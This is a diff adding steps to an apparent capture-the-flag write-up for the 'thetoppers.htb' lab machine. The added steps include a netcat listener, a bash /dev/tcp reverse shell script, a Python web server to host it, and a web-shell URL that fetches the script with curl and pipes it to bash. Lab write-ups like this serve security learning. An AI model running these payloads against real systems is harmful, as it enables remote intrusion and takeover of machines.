@@ -216,3 +216,29 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 
 now it takes we can use `cmd` as parameter and pass in the input command like `id`
 
+-> now we set up a netcat listener on port 1337
+
+```bash
+nc lvnp 1337
+```
+
+-> write a reverse shell payload to a file, `shell.sh`:
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_tun0_IP>/1337 0>&1
+```
+
+- opens TCP connection to local, and spawns an interactive bash also redirects the shell's stdout/stderr and stdin through the socket
+
+-> host `shell.sh` using local web server
+
+```bash
+python3 -m http.server 8000
+```
+
+---> trigger the reverse shell
+```css
+http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR_IP>:8000/shell.sh%20
+|%20bash
+```
+
